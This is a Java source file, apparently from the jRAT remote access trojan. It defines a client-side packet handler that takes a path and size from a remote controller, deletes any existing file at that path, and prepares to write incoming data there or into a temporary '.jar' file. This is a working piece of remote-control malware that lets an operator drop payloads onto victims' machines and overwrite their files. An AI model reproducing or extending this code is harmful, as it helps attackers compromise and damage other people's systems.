package jrat.module.fs.packets.download;

import jrat.client.Connection;
import jrat.client.packets.Temp;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.common.io.FileCache;
import jrat.common.io.TransferData;

import java.io.File;


public class Packet42Download implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean temp = con.readBoolean();
		String f = con.readLine();
		long l = con.readLong();
		
		File file;
		
		if (temp) {
			file = File.createTempFile("download", ".jar");
			Temp.MAP.put(f, file);
		} else {
			file = new File(f);
		}

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		TransferData d = new TransferData();
		d.setLocalFile(file);
		d.setTotal(l);
		FileCache.put(f, d);
	}

}
